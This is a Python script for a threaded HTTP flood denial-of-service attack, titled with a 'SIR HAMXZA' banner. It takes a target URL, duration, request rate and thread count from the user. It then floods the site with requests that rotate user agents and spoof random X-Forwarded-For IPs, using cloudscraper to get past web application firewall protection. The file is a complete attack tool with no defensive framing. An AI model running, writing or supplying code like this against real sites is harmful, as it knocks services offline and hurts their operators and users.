import random
import subprocess
import sys
import time
from threading import Thread
import requests
import cloudscraper
import subprocess
from colorama import Fore, init
init(autoreset=True)

def print_sir_hamxza():
    sir_hamxza_banner = subprocess.run(['figlet', '-f', 'block', 'SIR HAMXZA'], capture_output=True, text=True)
    print(Fore.BLUE + sir_hamxza_banner.stdout)
print_sir_hamxza()

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0',
    'Opera/9.80 (Windows NT 6.2; WOW64) Presto/2.12.388 Version/12.18'
]

def http_flood(url, time_sec, threads, rps):
    interval = 1 / rps
    start_time = time.time()

    def send_http_request():
        while time.time() - start_time < time_sec:
            user_agent = random.choice(user_agents)
            ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
            try:
                response = bypass_waf(url, user_agent, ip)
                print(f"Sent HTTP request to {url} with user agent: {user_agent} and IP: {ip}")
            except Exception as e:
                print(f"Failed to send HTTP request to {url}: {e}")

    threads_list = []
    for _ in range(threads):
        t = Thread(target=send_http_request)
        threads_list.append(t)
        t.start()

    time.sleep(time_sec)
    end_time = time.time()
    print(f"HTTP flood attack finished in {end_time - start_time} seconds")

def bypass_waf(url, user_agent, ip):
    scraper = cloudscraper.create_scraper()  # Creating a CloudScraper instance
    headers = {
        'User-Agent': user_agent,
        'X-Forwarded-For': ip
    }
    response = scraper.get(url, headers=headers)  # Using the scraper to make the request
    return response

def main():
    try:
        print("Enter the website URL:")
        url = input()
        print("Enter the time (in seconds):")
        time_sec = int(input())
        print("Enter the RPS (requests per second):")
        rps = int(input())
        print("Enter the threads:")
        threads = int(input())

        print("Attack is begin sending to the website...")
        http_flood(url, time_sec, threads, rps)
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()